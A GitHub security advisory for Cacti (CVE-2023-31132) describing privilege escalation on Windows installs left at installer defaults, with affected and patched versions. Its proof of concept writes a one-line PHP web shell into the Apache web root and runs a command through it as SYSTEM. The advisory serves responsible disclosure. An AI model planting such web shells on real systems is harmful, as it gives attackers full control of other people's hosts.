
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fsecurity%2Fadvisories%2FGHSA-rf5w-pq3f-9876)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fsecurity%2Fadvisories%2FGHSA-rf5w-pq3f-9876)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Cacti%2Fcacti)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Cacti](/Cacti)
/
**[cacti](/Cacti/cacti)**
Public

* [Notifications](/login?return_to=%2FCacti%2Fcacti) You must be signed in to change notification settings
* [Fork
  404](/login?return_to=%2FCacti%2Fcacti)
* [Star
   1.7k](/login?return_to=%2FCacti%2Fcacti)

* [Code](/Cacti/cacti)
* [Issues
  148](/Cacti/cacti/issues)
* [Pull requests
  0](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects
  0](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

Additional navigation options

* [Code](/Cacti/cacti)
* [Issues](/Cacti/cacti/issues)
* [Pull requests](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

# Privilege escalation when Cacti installed using Windows Installer defaults

High

[netniV](/netniV)
published
GHSA-rf5w-pq3f-9876
Sep 5, 2023

## Package

No package listed

## Affected versions

< 1.2.25

## Patched versions

1.2.25, 1.3.0

## Description

### Summary

*Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.*

A researcher within Tenable has discovered a privilege escalation vulnerability in Cacti 1.2.24. A low-privileged OS user with access to a Windows host where Cacti is installed can create arbitrary PHP files in a web document directory. The user can then execute the PHP files under the security context of SYSTEM.

### Details

*Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.*

We believe the vulnerability has a CVSSv3 vector of CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H. We have verified this issue with Cacti 1.2.24 installed on a Windows Server 2019 virtual machine. Here are the steps we used to set up the application:

* Download and run installer Cacti-1.2.24.exe as Administrator
* Select Apache as the web server and use defaults for other settings
* Login to the Cacti web UI to finish the initial Cacti configuration
* Create a low-privileged OS user (i.e., user1 in Users group) with RDP privilege

PoC:

// After login/RDP as user1

```
PS C:\Users\user1> echo '<?php system($_SERVER[''HTTP_X_CMD'']);?>' | Out-File -Encoding utf8 C:\Apache24\htdocs\cacti\webshell.php
PS C:\Users\user1>
PS C:\Users\user1> Invoke-WebRequest -UseBasicParsing -Headers @{'x-cmd'='whoami'} -Uri http://localhost/cacti/webshell.php | select -ExpandProperty  Content
nt authority\system

```
### Impact

*What kind of vulnerability is it? Who is impacted?*

Privilege escalation from normal user account to SYSTEM.

### Disclosure Policy

Tenable follows a 90-day vulnerability disclosure policy. That means, even though we prefer coordinated disclosure, we’ll issue an advisory on June 18, 2023 with or without a patch. Alternatively, any uncoordinated vendor release of a patch or advisory to any customers before the 90-day deadline will be considered public disclosure, and Tenable may release an advisory prior to the coordinated disclosure date. Please read the full details of our policy here: <https://static.tenable.com/research/tenable-vulnerability-disclosure-policy.pdf>.

This issue is tracked internally via TRA-469.

Thank you for taking the time to read this. We'd greatly appreciate it if you'd acknowledge receipt of this report. If you have any questions, we'd be happy to address them.

## BETA Installer version

A beta version of the 1.2.25 installer has been published along with a post on our forum regarding this at <https://forums.cacti.net/viewtopic.php?p=292797#p292797> which should be read prior to installing. This is not a production-ready release.

### Severity

High

7.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2023-31132

### Weaknesses

No CWEs

### Credits

* [![@DinoBytes](https://avatars.githubusercontent.com/u/1154405?s=40&v=4)](/DinoBytes)
  [DinoBytes](/DinoBytes)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

